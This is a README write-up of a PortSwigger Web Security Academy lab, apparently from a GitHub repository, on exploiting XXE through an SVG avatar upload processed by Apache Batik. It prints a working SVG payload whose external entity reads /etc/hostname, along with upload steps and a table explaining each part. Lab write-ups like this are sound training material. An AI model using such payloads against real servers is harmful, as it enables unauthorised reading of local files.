
### 📁 `README.md` — Exploiting XXE via SVG Image Upload

# 🖼️ Exploiting XXE via Image File Upload (SVG)

**🧪 Lab Level:** Practitioner  
**🔐 Vulnerability:** XXE in SVG image processed by Apache Batik  
**✅ Status:** Solved  
**🛠 Platform:** PortSwigger Web Security Academy  
**🎯 Objective:** Leak the contents of `/etc/hostname` by uploading a malicious SVG avatar image.

---

## 🔍 Lab Summary

The application allows users to upload avatar images in SVG format.  
It uses the **Apache Batik** library to process SVGs.  
The lab is vulnerable to **XXE via the SVG file**, enabling reading of local files like `/etc/hostname`.

---

## ⚙️ Exploitation Steps

### 1. 📝 Create the Malicious SVG

Save this payload as `exploit.svg` locally:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
````

---

### 2. 📤 Upload the SVG

* Post a comment on any blog post
* Upload `exploit.svg` as your avatar image

---

### 3. 👀 Verify the Output

View your comment:
You should see the **contents of `/etc/hostname` rendered as text inside the image**.

---

### 4. 🏁 Submit the Solution

Use the displayed hostname value from the image and submit it using the lab’s **“Submit solution”** button.
---

## 📸 Screenshots

Here are some screenshots demonstrating the successful exploitation of the XXE via SVG image upload lab:

![XXE](https://github.com/Kabilala/xxe/blob/main/lab8-1/lab8-1.png)

![XXE](https://github.com/Kabilala/xxe/blob/main/lab8-2/lab8-2.png)

---

## 🧠 Technical Details

| Feature                | Explanation                                        |
| ---------------------- | -------------------------------------------------- |
| `<!ENTITY xxe SYSTEM>` | Loads local file `/etc/hostname`                   |
| SVG with DOCTYPE       | Defines the external entity for XXE injection      |
| `<text>` element       | Renders the entity content visibly in SVG          |
| Apache Batik           | XML parser vulnerable to external entity expansion |

---
